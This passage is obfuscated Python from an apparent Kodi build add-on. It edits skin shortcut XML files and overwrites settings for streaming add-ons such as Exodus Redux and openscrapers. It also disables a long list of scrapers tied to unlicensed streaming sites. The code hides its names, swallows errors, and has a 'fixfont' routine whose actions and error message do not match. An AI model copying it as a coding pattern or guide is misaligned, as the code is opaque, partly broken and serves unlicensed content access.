		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1229
    with open (OOOOOO0O000000OO0 ,'w')as OO0000O0O000000OO :#line:1232
      OO0000O0O000000OO .write (O0O00O0OO000000OO )#line:1233
    OOOOOO0O000000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1237
    with open (OOOOOO0O000000OO0 ,'r')as OO0000O0O000000OO :#line:1238
      O0O00O0OO000000OO =OO0000O0O000000OO .read ()#line:1239
    O0O00O0OO000000OO =O0O00O0OO000000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1257
    with open (OOOOOO0O000000OO0 ,'w')as OO0000O0O000000OO :#line:1260
      OO0000O0O000000OO .write (O0O00O0OO000000OO )#line:1261
    OOOOOO0O000000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1265
    with open (OOOOOO0O000000OO0 ,'r')as OO0000O0O000000OO :#line:1266
      O0O00O0OO000000OO =OO0000O0O000000OO .read ()#line:1267
    O0O00O0OO000000OO =O0O00O0OO000000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1285
    with open (OOOOOO0O000000OO0 ,'w')as OO0000O0O000000OO :#line:1288
      OO0000O0O000000OO .write (O0O00O0OO000000OO )#line:1289
    OOOOOO0O000000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1292
    with open (OOOOOO0O000000OO0 ,'r')as OO0000O0O000000OO :#line:1293
      O0O00O0OO000000OO =OO0000O0O000000OO .read ()#line:1294
    O0O00O0OO000000OO =O0O00O0OO000000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1312
    with open (OOOOOO0O000000OO0 ,'w')as OO0000O0O000000OO :#line:1315
      OO0000O0O000000OO .write (O0O00O0OO000000OO )#line:1316
    OOOOOO0O000000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1318
    with open (OOOOOO0O000000OO0 ,'r')as OO0000O0O000000OO :#line:1319
      O0O00O0OO000000OO =OO0000O0O000000OO .read ()#line:1320
    O0O00O0OO000000OO =O0O00O0OO000000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1338
    with open (OOOOOO0O000000OO0 ,'w')as OO0000O0O000000OO :#line:1341
      OO0000O0O000000OO .write (O0O00O0OO000000OO )#line:1342
    OOOOOO0O000000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1344
    with open (OOOOOO0O000000OO0 ,'r')as OO0000O0O000000OO :#line:1345
      O0O00O0OO000000OO =OO0000O0O000000OO .read ()#line:1346
    O0O00O0OO000000OO =O0O00O0OO000000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1364
    with open (OOOOOO0O000000OO0 ,'w')as OO0000O0O000000OO :#line:1367
      OO0000O0O000000OO .write (O0O00O0OO000000OO )#line:1368
    OOOOOO0O000000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1371
    with open (OOOOOO0O000000OO0 ,'r')as OO0000O0O000000OO :#line:1372
      O0O00O0OO000000OO =OO0000O0O000000OO .read ()#line:1373
    O0O00O0OO000000OO =O0O00O0OO000000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1391
    with open (OOOOOO0O000000OO0 ,'w')as OO0000O0O000000OO :#line:1394
      OO0000O0O000000OO .write (O0O00O0OO000000OO )#line:1395
def rdbuildinstallON ():#line:1398
    try :#line:1400
       OO0000O000OOO0O0O =ADDONPATH +"/resources/rd/victory.xml"#line:1401
       OOOO00OO0OOO0OO00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1402
       copyfile (OO0000O000OOO0O0O ,OOOO00OO0OOO0OO00 )#line:1404
       OO0000O000OOO0O0O =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1406
       OOOO00OO0OOO0OO00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1407
       copyfile (OO0000O000OOO0O0O ,OOOO00OO0OOO0OO00 )#line:1409
       OO0000O000OOO0O0O =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1411
       OOOO00OO0OOO0OO00 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1412
       copyfile (OO0000O000OOO0O0O ,OOOO00OO0OOO0OO00 )#line:1414
       OO0000O000OOO0O0O =ADDONPATH +"/resources/rd/Splash.png"#line:1417
       OOOO00OO0OOO0OO00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1418
       copyfile (OO0000O000OOO0O0O ,OOOO00OO0OOO0OO00 )#line:1420
    except :#line:1422
       pass #line:1423
def rdbuild ():#line:1433
	OO0O0OOO0O0OOO0OO =(ADDON .getSetting ("auto_rd"))#line:1434
	if OO0O0OOO0O0OOO0OO =='true':#line:1435
		OOOOOO0O0OOOO0OOO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1436
		OOOOOO0O0OOOO0OOO .setSetting ('all_t','0')#line:1437
		OOOOOO0O0OOOO0OOO .setSetting ('rd_menu_enable','false')#line:1438
		OOOOOO0O0OOOO0OOO .setSetting ('magnet_bay','false')#line:1439
		OOOOOO0O0OOOO0OOO .setSetting ('magnet_extra','false')#line:1440
		OOOOOO0O0OOOO0OOO .setSetting ('rd_only','false')#line:1441
		OOOOOO0O0OOOO0OOO .setSetting ('ftp','false')#line:1443
		OOOOOO0O0OOOO0OOO .setSetting ('fp','false')#line:1444
		OOOOOO0O0OOOO0OOO .setSetting ('filter_fp','false')#line:1445
		OOOOOO0O0OOOO0OOO .setSetting ('fp_size_en','false')#line:1446
		OOOOOO0O0OOOO0OOO .setSetting ('afdah','false')#line:1447
		OOOOOO0O0OOOO0OOO .setSetting ('ap2s','false')#line:1448
		OOOOOO0O0OOOO0OOO .setSetting ('cin','false')#line:1449
		OOOOOO0O0OOOO0OOO .setSetting ('clv','false')#line:1450
		OOOOOO0O0OOOO0OOO .setSetting ('cmv','false')#line:1451
		OOOOOO0O0OOOO0OOO .setSetting ('dl20','false')#line:1452
		OOOOOO0O0OOOO0OOO .setSetting ('esc','false')#line:1453
		OOOOOO0O0OOOO0OOO .setSetting ('extra','false')#line:1454
		OOOOOO0O0OOOO0OOO .setSetting ('film','false')#line:1455
		OOOOOO0O0OOOO0OOO .setSetting ('fre','false')#line:1456
		OOOOOO0O0OOOO0OOO .setSetting ('fxy','false')#line:1457
		OOOOOO0O0OOOO0OOO .setSetting ('genv','false')#line:1458
		OOOOOO0O0OOOO0OOO .setSetting ('getgo','false')#line:1459
		OOOOOO0O0OOOO0OOO .setSetting ('gold','false')#line:1460
		OOOOOO0O0OOOO0OOO .setSetting ('gona','false')#line:1461
		OOOOOO0O0OOOO0OOO .setSetting ('hdmm','false')#line:1462
		OOOOOO0O0OOOO0OOO .setSetting ('hdt','false')#line:1463
		OOOOOO0O0OOOO0OOO .setSetting ('icy','false')#line:1464
		OOOOOO0O0OOOO0OOO .setSetting ('ind','false')#line:1465
		OOOOOO0O0OOOO0OOO .setSetting ('iwi','false')#line:1466
		OOOOOO0O0OOOO0OOO .setSetting ('jen_free','false')#line:1467
		OOOOOO0O0OOOO0OOO .setSetting ('kiss','false')#line:1468
		OOOOOO0O0OOOO0OOO .setSetting ('lavin','false')#line:1469
		OOOOOO0O0OOOO0OOO .setSetting ('los','false')#line:1470
		OOOOOO0O0OOOO0OOO .setSetting ('m4u','false')#line:1471
		OOOOOO0O0OOOO0OOO .setSetting ('mesh','false')#line:1472
		OOOOOO0O0OOOO0OOO .setSetting ('mf','false')#line:1473
		OOOOOO0O0OOOO0OOO .setSetting ('mkvc','false')#line:1474
		OOOOOO0O0OOOO0OOO .setSetting ('mjy','false')#line:1475
		OOOOOO0O0OOOO0OOO .setSetting ('hdonline','false')#line:1476
		OOOOOO0O0OOOO0OOO .setSetting ('moviex','false')#line:1477
		OOOOOO0O0OOOO0OOO .setSetting ('mpr','false')#line:1478
		OOOOOO0O0OOOO0OOO .setSetting ('mvg','false')#line:1479
		OOOOOO0O0OOOO0OOO .setSetting ('mvl','false')#line:1480
		OOOOOO0O0OOOO0OOO .setSetting ('mvs','false')#line:1481
		OOOOOO0O0OOOO0OOO .setSetting ('myeg','false')#line:1482
		OOOOOO0O0OOOO0OOO .setSetting ('ninja','false')#line:1483
		OOOOOO0O0OOOO0OOO .setSetting ('odb','false')#line:1484
		OOOOOO0O0OOOO0OOO .setSetting ('ophd','false')#line:1485
		OOOOOO0O0OOOO0OOO .setSetting ('pks','false')#line:1486
		OOOOOO0O0OOOO0OOO .setSetting ('prf','false')#line:1487
		OOOOOO0O0OOOO0OOO .setSetting ('put18','false')#line:1488
		OOOOOO0O0OOOO0OOO .setSetting ('req','false')#line:1489
		OOOOOO0O0OOOO0OOO .setSetting ('rftv','false')#line:1490
		OOOOOO0O0OOOO0OOO .setSetting ('rltv','false')#line:1491
		OOOOOO0O0OOOO0OOO .setSetting ('sc','false')#line:1492
		OOOOOO0O0OOOO0OOO .setSetting ('seehd','false')#line:1493
		OOOOOO0O0OOOO0OOO .setSetting ('showbox','false')#line:1494
		OOOOOO0O0OOOO0OOO .setSetting ('shuid','false')#line:1495
		OOOOOO0O0OOOO0OOO .setSetting ('sil_gh','false')#line:1496
		OOOOOO0O0OOOO0OOO .setSetting ('spv','false')#line:1497
		OOOOOO0O0OOOO0OOO .setSetting ('subs','false')#line:1498
		OOOOOO0O0OOOO0OOO .setSetting ('tvs','false')#line:1499
		OOOOOO0O0OOOO0OOO .setSetting ('tw','false')#line:1500
		OOOOOO0O0OOOO0OOO .setSetting ('upto','false')#line:1501
		OOOOOO0O0OOOO0OOO .setSetting ('vel','false')#line:1502
		OOOOOO0O0OOOO0OOO .setSetting ('vex','false')#line:1503
		OOOOOO0O0OOOO0OOO .setSetting ('vidc','false')#line:1504
		OOOOOO0O0OOOO0OOO .setSetting ('w4hd','false')#line:1505
		OOOOOO0O0OOOO0OOO .setSetting ('wav','false')#line:1506
		OOOOOO0O0OOOO0OOO .setSetting ('wf','false')#line:1507
		OOOOOO0O0OOOO0OOO .setSetting ('wse','false')#line:1508
		OOOOOO0O0OOOO0OOO .setSetting ('wss','false')#line:1509
		OOOOOO0O0OOOO0OOO .setSetting ('wsse','false')#line:1510
		OOOOOO0O0OOOO0OOO =xbmcaddon .Addon ('plugin.video.speedmax')#line:1511
		OOOOOO0O0OOOO0OOO .setSetting ('debrid.only','true')#line:1512
		OOOOOO0O0OOOO0OOO .setSetting ('hosts.captcha','false')#line:1513
		OOOOOO0O0OOOO0OOO =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1514
		OOOOOO0O0OOOO0OOO .setSetting ('provider.123moviehd','false')#line:1515
		OOOOOO0O0OOOO0OOO .setSetting ('provider.300mbdownload','false')#line:1516
		OOOOOO0O0OOOO0OOO .setSetting ('provider.alltube','false')#line:1517
		OOOOOO0O0OOOO0OOO .setSetting ('provider.allucde','false')#line:1518
		OOOOOO0O0OOOO0OOO .setSetting ('provider.animebase','false')#line:1519
		OOOOOO0O0OOOO0OOO .setSetting ('provider.animeloads','false')#line:1520
		OOOOOO0O0OOOO0OOO .setSetting ('provider.animetoon','false')#line:1521
		OOOOOO0O0OOOO0OOO .setSetting ('provider.bnwmovies','false')#line:1522
		OOOOOO0O0OOOO0OOO .setSetting ('provider.boxfilm','false')#line:1523
		OOOOOO0O0OOOO0OOO .setSetting ('provider.bs','false')#line:1524
		OOOOOO0O0OOOO0OOO .setSetting ('provider.cartoonhd','false')#line:1525
		OOOOOO0O0OOOO0OOO .setSetting ('provider.cdahd','false')#line:1526
		OOOOOO0O0OOOO0OOO .setSetting ('provider.cdax','false')#line:1527
		OOOOOO0O0OOOO0OOO .setSetting ('provider.cine','false')#line:1528
		OOOOOO0O0OOOO0OOO .setSetting ('provider.cinenator','false')#line:1529
		OOOOOO0O0OOOO0OOO .setSetting ('provider.cmovieshdbz','false')#line:1530
		OOOOOO0O0OOOO0OOO .setSetting ('provider.coolmoviezone','false')#line:1531
		OOOOOO0O0OOOO0OOO .setSetting ('provider.ddl','false')#line:1532
		OOOOOO0O0OOOO0OOO .setSetting ('provider.deepmovie','false')#line:1533
		OOOOOO0O0OOOO0OOO .setSetting ('provider.ekinomaniak','false')#line:1534
		OOOOOO0O0OOOO0OOO .setSetting ('provider.ekinotv','false')#line:1535
		OOOOOO0O0OOOO0OOO .setSetting ('provider.filiser','false')#line:1536
		OOOOOO0O0OOOO0OOO .setSetting ('provider.filmpalast','false')#line:1537
		OOOOOO0O0OOOO0OOO .setSetting ('provider.filmwebbooster','false')#line:1538
		OOOOOO0O0OOOO0OOO .setSetting ('provider.filmxy','false')#line:1539
		OOOOOO0O0OOOO0OOO .setSetting ('provider.fmovies','false')#line:1540
		OOOOOO0O0OOOO0OOO .setSetting ('provider.foxx','false')#line:1541
		OOOOOO0O0OOOO0OOO .setSetting ('provider.freefmovies','false')#line:1542
		OOOOOO0O0OOOO0OOO .setSetting ('provider.freeputlocker','false')#line:1543
		OOOOOO0O0OOOO0OOO .setSetting ('provider.furk','false')#line:1544
		OOOOOO0O0OOOO0OOO .setSetting ('provider.gamatotv','false')#line:1545
		OOOOOO0O0OOOO0OOO .setSetting ('provider.gogoanime','false')#line:1546
		OOOOOO0O0OOOO0OOO .setSetting ('provider.gowatchseries','false')#line:1547
		OOOOOO0O0OOOO0OOO .setSetting ('provider.hackimdb','false')#line:1548
		OOOOOO0O0OOOO0OOO .setSetting ('provider.hdfilme','false')#line:1549
		OOOOOO0O0OOOO0OOO .setSetting ('provider.hdmto','false')#line:1550
		OOOOOO0O0OOOO0OOO .setSetting ('provider.hdpopcorns','false')#line:1551
		OOOOOO0O0OOOO0OOO .setSetting ('provider.hdstreams','false')#line:1552
		OOOOOO0O0OOOO0OOO .setSetting ('provider.horrorkino','false')#line:1554
		OOOOOO0O0OOOO0OOO .setSetting ('provider.iitv','false')#line:1555
		OOOOOO0O0OOOO0OOO .setSetting ('provider.iload','false')#line:1556
		OOOOOO0O0OOOO0OOO .setSetting ('provider.iwaatch','false')#line:1557
		OOOOOO0O0OOOO0OOO .setSetting ('provider.kinodogs','false')#line:1558
		OOOOOO0O0OOOO0OOO .setSetting ('provider.kinoking','false')#line:1559
		OOOOOO0O0OOOO0OOO .setSetting ('provider.kinow','false')#line:1560
		OOOOOO0O0OOOO0OOO .setSetting ('provider.kinox','false')#line:1561
		OOOOOO0O0OOOO0OOO .setSetting ('provider.lichtspielhaus','false')#line:1562
		OOOOOO0O0OOOO0OOO .setSetting ('provider.liomenoi','false')#line:1563
		OOOOOO0O0OOOO0OOO .setSetting ('provider.magnetdl','false')#line:1566
		OOOOOO0O0OOOO0OOO .setSetting ('provider.megapelistv','false')#line:1567
		OOOOOO0O0OOOO0OOO .setSetting ('provider.movie2k-ac','false')#line:1568
		OOOOOO0O0OOOO0OOO .setSetting ('provider.movie2k-ag','false')#line:1569
		OOOOOO0O0OOOO0OOO .setSetting ('provider.movie2z','false')#line:1570
		OOOOOO0O0OOOO0OOO .setSetting ('provider.movie4k','false')#line:1571
		OOOOOO0O0OOOO0OOO .setSetting ('provider.movie4kis','false')#line:1572
		OOOOOO0O0OOOO0OOO .setSetting ('provider.movieneo','false')#line:1573
		OOOOOO0O0OOOO0OOO .setSetting ('provider.moviesever','false')#line:1574
		OOOOOO0O0OOOO0OOO .setSetting ('provider.movietown','false')#line:1575
		OOOOOO0O0OOOO0OOO .setSetting ('provider.mvrls','false')#line:1577
		OOOOOO0O0OOOO0OOO .setSetting ('provider.netzkino','false')#line:1578
		OOOOOO0O0OOOO0OOO .setSetting ('provider.odb','false')#line:1579
		OOOOOO0O0OOOO0OOO .setSetting ('provider.openkatalog','false')#line:1580
		OOOOOO0O0OOOO0OOO .setSetting ('provider.ororo','false')#line:1581
		OOOOOO0O0OOOO0OOO .setSetting ('provider.paczamy','false')#line:1582
		OOOOOO0O0OOOO0OOO .setSetting ('provider.peliculasdk','false')#line:1583
		OOOOOO0O0OOOO0OOO .setSetting ('provider.pelisplustv','false')#line:1584
		OOOOOO0O0OOOO0OOO .setSetting ('provider.pepecine','false')#line:1585
		OOOOOO0O0OOOO0OOO .setSetting ('provider.primewire','false')#line:1586
		OOOOOO0O0OOOO0OOO .setSetting ('provider.projectfreetv','false')#line:1587
		OOOOOO0O0OOOO0OOO .setSetting ('provider.proxer','false')#line:1588
		OOOOOO0O0OOOO0OOO .setSetting ('provider.pureanime','false')#line:1589
		OOOOOO0O0OOOO0OOO .setSetting ('provider.putlocker','false')#line:1590
		OOOOOO0O0OOOO0OOO .setSetting ('provider.putlockerfree','false')#line:1591
		OOOOOO0O0OOOO0OOO .setSetting ('provider.reddit','false')#line:1592
		OOOOOO0O0OOOO0OOO .setSetting ('provider.cartoonwire','false')#line:1593
		OOOOOO0O0OOOO0OOO .setSetting ('provider.seehd','false')#line:1594
		OOOOOO0O0OOOO0OOO .setSetting ('provider.segos','false')#line:1595
		OOOOOO0O0OOOO0OOO .setSetting ('provider.serienstream','false')#line:1596
		OOOOOO0O0OOOO0OOO .setSetting ('provider.series9','false')#line:1597
		OOOOOO0O0OOOO0OOO .setSetting ('provider.seriesever','false')#line:1598
		OOOOOO0O0OOOO0OOO .setSetting ('provider.seriesonline','false')#line:1599
		OOOOOO0O0OOOO0OOO .setSetting ('provider.seriespapaya','false')#line:1600
		OOOOOO0O0OOOO0OOO .setSetting ('provider.sezonlukdizi','false')#line:1601
		OOOOOO0O0OOOO0OOO .setSetting ('provider.solarmovie','false')#line:1602
		OOOOOO0O0OOOO0OOO .setSetting ('provider.solarmoviez','false')#line:1603
		OOOOOO0O0OOOO0OOO .setSetting ('provider.stream-to','false')#line:1604
		OOOOOO0O0OOOO0OOO .setSetting ('provider.streamdream','false')#line:1605
		OOOOOO0O0OOOO0OOO .setSetting ('provider.streamflix','false')#line:1606
		OOOOOO0O0OOOO0OOO .setSetting ('provider.streamit','false')#line:1607
		OOOOOO0O0OOOO0OOO .setSetting ('provider.swatchseries','false')#line:1608
		OOOOOO0O0OOOO0OOO .setSetting ('provider.szukajkatv','false')#line:1609
		OOOOOO0O0OOOO0OOO .setSetting ('provider.tainiesonline','false')#line:1610
		OOOOOO0O0OOOO0OOO .setSetting ('provider.tainiomania','false')#line:1611
		OOOOOO0O0OOOO0OOO .setSetting ('provider.tata','false')#line:1614
		OOOOOO0O0OOOO0OOO .setSetting ('provider.trt','false')#line:1615
		OOOOOO0O0OOOO0OOO .setSetting ('provider.tvbox','false')#line:1616
		OOOOOO0O0OOOO0OOO .setSetting ('provider.ultrahd','false')#line:1617
		OOOOOO0O0OOOO0OOO .setSetting ('provider.video4k','false')#line:1618
		OOOOOO0O0OOOO0OOO .setSetting ('provider.vidics','false')#line:1619
		OOOOOO0O0OOOO0OOO .setSetting ('provider.view4u','false')#line:1620
		OOOOOO0O0OOOO0OOO .setSetting ('provider.watchseries','false')#line:1621
		OOOOOO0O0OOOO0OOO .setSetting ('provider.xrysoi','false')#line:1622
		OOOOOO0O0OOOO0OOO .setSetting ('provider.library','false')#line:1623
def fixfont ():#line:1626
	OOO00OO000000OOOO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1627
	O0O000O0OO0OOO0O0 =json .loads (OOO00OO000000OOOO );#line:1629
	OOO0O0OOOOO00O000 =O0O000O0OO0OOO0O0 ["result"]["settings"]#line:1630
	O0OOOOO0OO000O000 =[O00O0OO0O0OOO0000 for O00O0OO0O0OOO0000 in OOO0O0OOOOO00O000 if O00O0OO0O0OOO0000 ["id"]=="audiooutput.audiodevice"][0 ]#line:1632
	OO0OOOO0OO00O00O0 =O0OOOOO0OO000O000 ["options"];#line:1633
	O000OOO0OO0OO00OO =O0OOOOO0OO000O000 ["value"];#line:1634
	OO0O0O0000OOO0OOO =[O000000000OOO0O00 for (O000000000OOO0O00 ,OOOO0O000OO0O0OO0 )in enumerate (OO0OOOO0OO00O00O0 )if OOOO0O000OO0O0OO0 ["value"]==O000OOO0OO0OO00OO ][0 ];#line:1636
	O0OO0O00OOOOOOOO0 =(OO0O0O0000OOO0OOO +1 )%len (OO0OOOO0OO00O00O0 )#line:1638
	O0O00000O000O000O =OO0OOOO0OO00O00O0 [O0OO0O00OOOOOOOO0 ]["value"]#line:1640
	O00OO00O000OO0O0O =OO0OOOO0OO00O00O0 [O0OO0O00OOOOOOOO0 ]["label"]#line:1641
	O00OOOOO00OOO00O0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1643
	try :#line:1645
		O000OO00O00O0OOOO =json .loads (O00OOOOO00OOO00O0 );#line:1646
		if O000OO00O00O0OOOO ["result"]!=True :#line:1648
			raise Exception #line:1649
	except :#line:1650
		sys .stderr .write ("Error switching audio output device")#line:1651
		raise Exception #line:1652
def parseDOM2 (OO000O0000OOO00O0 ,name =u"",attrs ={},ret =False ):#line:1653
	if isinstance (OO000O0000OOO00O0 ,str ):#line:1656
		try :#line:1657
			OO000O0000OOO00O0 =[OO000O0000OOO00O0 .decode ("utf-8")]#line:1658
		except :#line:1659
			OO000O0000OOO00O0 =[OO000O0000OOO00O0 ]#line:1660
	elif isinstance (OO000O0000OOO00O0 ,unicode ):#line:1661
		OO000O0000OOO00O0 =[OO000O0000OOO00O0 ]#line:1662
	elif not isinstance (OO000O0000OOO00O0 ,list ):#line:1663
		return u""#line:1664
	if not name .strip ():#line:1666
		return u""#line:1667
	OOO0000OO00O0O000 =[]#line:1669
	for O0O0O0O0OO0OO00O0 in OO000O0000OOO00O0 :#line:1670
		OO0OOOOO000O0O0O0 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O0O0O0O0OO0OO00O0 )#line:1671
		for OO000O00O0O00O000 in OO0OOOOO000O0O0O0 :#line:1672
			O0O0O0O0OO0OO00O0 =O0O0O0O0OO0OO00O0 .replace (OO000O00O0O00O000 ,OO000O00O0O00O000 .replace ("\n"," "))#line:1673
		OOO000O00OO00OOOO =[]#line:1675
		for OO00O0O0O0O0OOO00 in attrs :#line:1676
			OOO00O0OOOOOO00O0 =re .compile ('(<'+name +'[^>]*?(?:'+OO00O0O0O0O0OOO00 +'=[\'"]'+attrs [OO00O0O0O0O0OOO00 ]+'[\'"].*?>))',re .M |re .S ).findall (O0O0O0O0OO0OO00O0 )#line:1677
			if len (OOO00O0OOOOOO00O0 )==0 and attrs [OO00O0O0O0O0OOO00 ].find (" ")==-1 :#line:1678
				OOO00O0OOOOOO00O0 =re .compile ('(<'+name +'[^>]*?(?:'+OO00O0O0O0O0OOO00 +'='+attrs [OO00O0O0O0O0OOO00 ]+'.*?>))',re .M |re .S ).findall (O0O0O0O0OO0OO00O0 )#line:1679
			if len (OOO000O00OO00OOOO )==0 :#line:1681
				OOO000O00OO00OOOO =OOO00O0OOOOOO00O0 #line:1682
				OOO00O0OOOOOO00O0 =[]#line:1683
			else :#line:1684
				O0000000O0OOOO0O0 =range (len (OOO000O00OO00OOOO ))#line:1685
				O0000000O0OOOO0O0 .reverse ()#line:1686
				for OO0O0O0OOO0OO0OOO in O0000000O0OOOO0O0 :#line:1687
					if not OOO000O00OO00OOOO [OO0O0O0OOO0OO0OOO ]in OOO00O0OOOOOO00O0 :#line:1688
						del (OOO000O00OO00OOOO [OO0O0O0OOO0OO0OOO ])#line:1689
		if len (OOO000O00OO00OOOO )==0 and attrs =={}:#line:1691
			OOO000O00OO00OOOO =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O0O0O0O0OO0OO00O0 )#line:1692
			if len (OOO000O00OO00OOOO )==0 :#line:1693
				OOO000O00OO00OOOO =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O0O0O0O0OO0OO00O0 )#line:1694
		if isinstance (ret ,str ):#line:1696
			OOO00O0OOOOOO00O0 =[]#line:1697
			for OO000O00O0O00O000 in OOO000O00OO00OOOO :#line:1698
				OOOOO00O000000OOO =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OO000O00O0O00O000 )#line:1699
				if len (OOOOO00O000000OOO )==0 :#line:1700
					OOOOO00O000000OOO =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OO000O00O0O00O000 )#line:1701
				for O00OO0O00O0OOO00O in OOOOO00O000000OOO :#line:1702
					O0OO0OOO0OOO0O0O0 =O00OO0O00O0OOO00O [0 ]#line:1703
					if O0OO0OOO0OOO0O0O0 in "'\"":#line:1704
						if O00OO0O00O0OOO00O .find ('='+O0OO0OOO0OOO0O0O0 ,O00OO0O00O0OOO00O .find (O0OO0OOO0OOO0O0O0 ,1 ))>-1 :#line:1705
							O00OO0O00O0OOO00O =O00OO0O00O0OOO00O [:O00OO0O00O0OOO00O .find ('='+O0OO0OOO0OOO0O0O0 ,O00OO0O00O0OOO00O .find (O0OO0OOO0OOO0O0O0 ,1 ))]#line:1706
						if O00OO0O00O0OOO00O .rfind (O0OO0OOO0OOO0O0O0 ,1 )>-1 :#line:1708
							O00OO0O00O0OOO00O =O00OO0O00O0OOO00O [1 :O00OO0O00O0OOO00O .rfind (O0OO0OOO0OOO0O0O0 )]#line:1709
					else :#line:1710
						if O00OO0O00O0OOO00O .find (" ")>0 :#line:1711
							O00OO0O00O0OOO00O =O00OO0O00O0OOO00O [:O00OO0O00O0OOO00O .find (" ")]#line:1712
						elif O00OO0O00O0OOO00O .find ("/")>0 :#line:1713
